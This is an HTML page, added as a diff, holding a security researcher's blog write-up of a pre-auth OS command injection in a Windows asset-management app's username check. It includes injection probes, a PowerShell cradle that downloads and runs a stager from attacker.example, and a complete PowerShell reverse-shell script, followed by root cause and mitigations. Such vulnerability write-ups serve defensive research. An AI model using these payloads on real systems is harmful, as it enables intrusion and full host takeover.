@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>Unauthenticated OS Command Injection in a Login Pre-Check — thevillagehacker</title>
+<meta name="description" content="How a Windows-hosted asset management app turned username existence checks into out-of-band command execution and PowerShell reverse shells — with the theory behind testing auth for OS sinks."/>
+<link rel="icon" href="/assets/images/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/assets/images/favicon-32.png" type="image/png" sizes="32x32">
+<link rel="apple-touch-icon" href="/assets/images/apple-touch-icon.png" sizes="180x180">
+<meta name="theme-color" content="#0a090b"/>
+
+<!-- Critical black + red cyber fallback if stylesheet is slow/missing -->
+<style>
+  html,body{background:#0a090b;color:#e8e2e4;}
+  body{font-family:"Helvetica Neue",Inter,ui-sans-serif,system-ui,sans-serif;line-height:1.6;margin:0;}
+  a{color:#ff2a3d;}
+</style>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="/assets/css/style.css"/>
+
+<style>
+/* Token colors for highlight.js — black + red cyber (window chrome lives in style.css) */
+.hljs-keyword{color:#c792ea !important;}
+.hljs-string{color:#ecc48d !important;}
+.hljs-title{color:#ff6b7a !important;}
+.hljs-comment{color:#5c5458 !important;}
+.hljs-number{color:#f78c6c !important;}
+.hljs-built_in{color:#ff8a96 !important;}
+.hljs-attr{color:#ffcb6b !important;}
+.hljs-attribute{color:#ffcb6b !important;}
+.hljs-meta{color:#ff2a3d !important;}
+.hljs-literal{color:#ff8a96 !important;}
+.hljs-name{color:#ff6b7a !important;}
+.hljs-tag{color:#ff8a96 !important;}
+.hljs-selector-tag{color:#ff2a3d !important;}
+.hljs-type{color:#ff6b7a !important;}
+.hljs-symbol{color:#ff6b7a !important;}
+.hljs-bullet{color:#ff2a3d !important;}
+.hljs-link{color:#ff2a3d !important;}
+.hljs-addition{color:#ff6b7a !important;}
+</style>
+</head>
+
+<body class="has-site-fx post-page">
+
+<nav class="top-nav landing-nav">
+    <div class="nav-inner landing-nav-inner">
+        <a href="/" class="nav-brand">
+            <span class="nav-prompt">~/</span>thevillagehacker<span class="nav-path">/posts</span>
+            <span class="status-dot" title="research post"></span>
+        </a>
+        <div class="nav-right">
+            <span class="nav-clock" id="nav-clock" aria-hidden="true"></span>
+            <a href="/" class="nav-link">Home</a>
+            <a href="/blog.html" class="nav-link nav-link-active">Blog</a>
+            <a href="https://thevillagehacker-security.gitbook.io/ctf-writeups" class="nav-link" target="_blank" rel="noopener">Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<div class="advisory-banner">
+    OS COMMAND INJECTION // OOB // POWERSHELL RCE
+</div>
+
+<div class="container post-container">
+
+<header class="header">
+
+    <span class="cve-tag">WEB APPLICATION SECURITY</span>
+
+    <h1>Unauthenticated OS Command Injection in a Login Pre-Check</h1>
+
+    <p class="subtitle">WINDOWS // AUTH WORKFLOW // BOOLEAN ORACLE</p>
+
+    <div class="meta">
+        <div class="meta-item">
+            <div class="label">researcher</div>
+            <div class="value">Naveen Jagadeesan</div>
+        </div>
+        <div class="meta-item">
+            <div class="label">published</div>
+            <div class="value">2024-12-10</div>
+        </div>
+        <div class="meta-item">
+            <div class="label">platform</div>
+            <div class="value">Windows / Web Application</div>
+        </div>
+    </div>
+
+</header>
+
+<article>
+
+<h2 id="summary">Summary</h2>
+<p>An asset-management web application exposed an unauthenticated (or pre-auth) username check that concatenated user input into an OS command on a <strong>Windows</strong> host. Responses were nearly binary (<code>success: true/false</code>), so confirmation relied on <strong>out-of-band (OOB)</strong> and timing signals. A PowerShell stager completed full RCE under a high-privilege service account.</p>
+<h2 id="why-look-for-rce-on-a-login-form">Why look for RCE on a login form?</h2>
+<p>Auth endpoints are usually tested for:</p>
+<ul>
+<li>credential stuffing resistance</li>
+<li>user enumeration</li>
+<li>injection into SQL/LDAP</li>
+</ul>
+<p>The less common — but high-yield — theory:</p>
+<blockquote>
+<p>Any “does this username exist?” feature that shells out to legacy enterprise tools (mail, directory, provisioning scripts, custom validators) can become an OS injection sink <strong>before</strong> password verification.</p>
+</blockquote>
+<p>SSO options (Google/GitHub) on the same app increased confidence that the stack was modern on the outside and messy on the edges — exactly where shell helpers hide.</p>
+<h2 id="attack-surface">Attack surface</h2>
+<ul>
+<li>Asset management portal</li>
+<li>Auth: local password + Google SSO + GitHub SSO</li>
+<li>Host OS signals pointed to <strong>Windows</strong></li>
+<li>Interesting call: username existence / pre-login validation JSON API</li>
+</ul>
+<pre><code class="hljs language-http">POST /username_exists HTTP/1.1
+Host: target.example
+Content-Type: application/json
+
+{
+  &quot;username&quot;: &quot;whoami&quot;
+}
+</code></pre>
+<pre><code class="hljs language-http">HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Content-Type: application/json
+
+{&quot;success&quot;: false}
+</code></pre>
+<p>No stdout reflection. That does <strong>not</strong> mean no execution — it means you need a side channel.</p>
+<h2 id="theory-validation-strategy">Theory → validation strategy</h2>
+<p>For blind OS injection on Windows:</p>
+<ol>
+<li><strong>Time oracle</strong>: <code>ping -n 5 127.0.0.1</code> style delays (mind Windows ping syntax).</li>
+<li><strong>DNS/HTTP OOB</strong>: force the host to call attacker infrastructure.</li>
+<li><strong>File write / download</strong> to a monitored location if available.</li>
+</ol>
+<p>Payload class used during confirmation:</p>
+<pre><code class="hljs language-text">|ping -n 5 127.0.0.1||
+|curl http://oast.example/u||
+</code></pre>
+<p>(Exact separator depends on whether the sink is <code>cmd.exe</code> or PowerShell; pipe/ampersand chaining is part of the probe set.)</p>
+<p>Outbound fetch to an attacker-controlled URL confirmed execution even when the JSON body stayed <code>false</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Once OOB was stable, escalate from proof to shell. On Windows service hosts, PowerShell download cradles remain pragmatic when egress allows HTTP(S):</p>
+<pre><code class="hljs language-text">|powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('https://attacker.example/stage.ps1')&quot;||
+</code></pre>
+<p>Stager concept (listener-side reverse shell pattern):</p>
+<pre><code class="hljs language-powershell">$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String);
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte, 0, $sendbyte.Length);
+  $stream.Flush()
+};
+$client.Close()
+</code></pre>
+<p>Observed impact: reverse shell with <strong>administrative-equivalent</strong> process privileges — full host compromise from a pre-auth field.</p>
+<h2 id="what-made-this-interesting">What made this interesting</h2>
+<ol>
+<li><strong>Pre-auth / auth-adjacent RCE</strong> — no valid password required for the sink.</li>
+<li><strong>Blindness done right</strong> — boolean API did not stop exploitation; it forced better methodology.</li>
+<li><strong>Privilege of the app pool</strong> — injection without least privilege turned a web bug into a domain-relevant host issue.</li>
+<li><strong>Login is “boring” surface</strong> that still hides shell-outs in enterprise apps.</li>
+</ol>
+<h2 id="root-cause">Root cause</h2>
+<ul>
+<li>User input concatenated into OS commands</li>
+<li>No allowlist for usernames (format, charset, length)</li>
+<li>No parameterization / safe APIs for the underlying check</li>
+<li>Over-privileged service account</li>
+<li>Insufficient egress controls (stager download succeeded)</li>
+</ul>
+<h2 id="mitigations">Mitigations</h2>
+<ul>
+<li>Eliminate shell-outs from auth flows; use native libraries/APIs.</li>
+<li>If external tools are unavoidable, <strong>fixed argv arrays</strong> — never string build.</li>
+<li>Strict username grammar validation before any backend call.</li>
+<li>Run app pools as low-privilege users; block unexpected egress.</li>
+<li>Detect anomalous child processes from the web worker (<code>cmd.exe</code>, <code>powershell.exe</code>).</li>
+</ul>
+<h2 id="takeaway">Takeaway</h2>
+<p>When an auth API only returns booleans, <strong>assume blind execution is still on the table</strong>. Prove it with time and OOB first; reverse shells second. The best RCE findings often sit one function call behind “username already taken.”</p>
+
+
+</article>
+
+<footer>
+    <span class="footer-text">
+        © 2024 <a href="/">thevillagehacker</a> — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+        status: active<span class="blink"></span>
+    </span>
+</footer>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+<!-- site.js: cyber mesh atmosphere · nav clock · HTTP request/response highlighter -->
+<script src="/assets/js/site.js" defer></script>
+</body>
+</html>
